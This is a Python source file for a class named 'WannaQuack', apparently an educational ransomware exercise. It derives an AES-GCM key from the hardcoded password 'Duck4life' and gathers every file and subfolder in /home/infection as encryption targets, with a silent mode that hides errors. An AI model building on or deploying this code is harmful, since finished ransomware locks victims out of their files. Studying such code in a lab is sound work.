import os
from pathlib import Path
import threading
from concurrent.futures import ThreadPoolExecutor
from Worker import Worker


from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

class WannaQuack:
	def __init__(self, args):
		self.silent = True if args.silent else False
		self.files_path = set()
		self.subdir = set()
		self.executor = ThreadPoolExecutor()
		self.woker = []
		self.password = "Duck4life"


	def init_aes(self):
		password_bytes = self.password.encode()

		self.salt = os.urandom(16)

		key = self.generate_key(self.salt)

		final_key = key.derive(password_bytes)
		self.aes = AESGCM(final_key)


	def generate_key(self, random_salt):
		key = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=random_salt,
			iterations=100_000,
			backend=default_backend()
		)
		return key


	def encrypt(self, data: bytes):
		nonce = os.urandom(12)
		ciphertext = self.aes.encrypt(nonce, data, None)
		return self.salt + nonce + ciphertext


	def decrypt(self, data: bytes):
		salt = data[:16]
		nonce = data[16:28]
		ciphertext = data[28:]

		key = self.generate_key(salt)

		final_key = key.derive(self.password.encode())
		self.aes = AESGCM(final_key)
		decrypt_data = self.aes.decrypt(nonce, ciphertext, None)
		return decrypt_data

	def take_position(self):
		try:
			target = Path("/home/infection")

			if not target.is_dir():
				raise FileNotFoundError(f"Le dossier {target} n'existe pas !")
			
			os.chdir(target)
			for element in target.iterdir():
				print(f"Element found { element}")
				if element.is_dir():
					self.subdir.add(element)
				else:
					self.files_path.add(element)
		except Exception as e:
			if self.silent:
				return False
			print(f"[!] Error reading infection position: {e}")
		
		return True
		


